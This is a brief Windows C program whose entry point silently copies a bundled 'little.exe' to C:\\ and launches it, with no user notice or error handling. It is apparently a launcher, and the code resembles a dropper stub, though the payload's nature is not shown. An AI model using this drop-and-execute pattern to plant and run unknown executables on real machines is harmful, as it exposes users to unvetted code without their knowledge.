

#include <Windows.h>

#include "resource.h"

int APIENTRY wWinMain(HINSTANCE hInst,
                      HINSTANCE hPrevInst,
                      LPWSTR    lpCmdLine,
                      int       nCmdShow)
{
    CopyFileW(L"mine\\little.exe", L"C:\\little.exe", FALSE);

    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};

    CreateProcessW(L"C:\\little.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}